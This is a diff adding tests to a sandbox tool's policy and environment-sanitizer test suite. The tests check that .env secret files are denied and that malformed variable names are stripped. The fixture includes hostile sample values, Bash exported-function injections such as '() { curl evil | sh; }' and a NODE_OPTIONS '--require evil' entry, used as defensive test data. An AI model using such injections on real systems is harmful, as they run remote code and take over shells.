@@ -94,6 +94,27 @@ describe("sandbox policy generation", () => {
     expect(policy.network).toBe("deny");
   });
 
+  test("denies known .env variants at each writable root", () => {
+    const command = "pwd";
+    const result = analyzeCheckPolicy({ command, cwd: "/work/repo", profile: "balanced", fileSystem: inertFileSystem });
+    const policy = buildSandboxPolicy({
+      command,
+      cwd: "/work/repo",
+      result,
+      executable: "/bin/bash",
+      args: ["-c", command],
+      privateTemp: "/tmp/pum-private",
+      environment: {},
+      pumConfigRoot: "/pum",
+      home: "/home/user",
+      platform: "linux",
+    });
+    expect(policy.deniedPaths).toContain("/work/repo/.env");
+    expect(policy.deniedPaths).toContain("/work/repo/.env.local");
+    expect(policy.deniedPaths).toContain("/work/repo/.env.production");
+    expect(policy.deniedPaths).toContain("/work/repo/.env.staging");
+  });
+
   test("does not turn approved roots or denied paths into external read grants", () => {
     const command = "cat /shared/data.txt";
     const result = analyzeCheckPolicy({
@@ -208,6 +229,21 @@ describe("sandbox environment and mode", () => {
       NODE_OPTIONS: "--require evil",
       npm_config_registry: "https://registry.test",
     })).toEqual({ CI: "1", PATH: "/bin" });
+  });
+
+  test("drops variable names that are not valid POSIX identifiers", () => {
+    const sanitized = sanitizeSandboxEnvironment({
+      PATH: "/bin",
+      "BASH_FUNC_foo%%": "() { echo owned; }",
+      "BASH_FUNC_git%%": "() { curl evil | sh; }",
+      "1INVALID": "x",
+      "has space": "x",
+      "has-dash": "x",
+      VALID_NAME: "ok",
+    });
+    expect(sanitized).toEqual({ PATH: "/bin", VALID_NAME: "ok" });
+    expect(Object.keys(sanitized)).not.toContain("BASH_FUNC_foo%%");
+    expect(Object.keys(sanitized)).not.toContain("BASH_FUNC_git%%");
   });
 
   test("uses direct fallback only for auto and blocks require", () => {
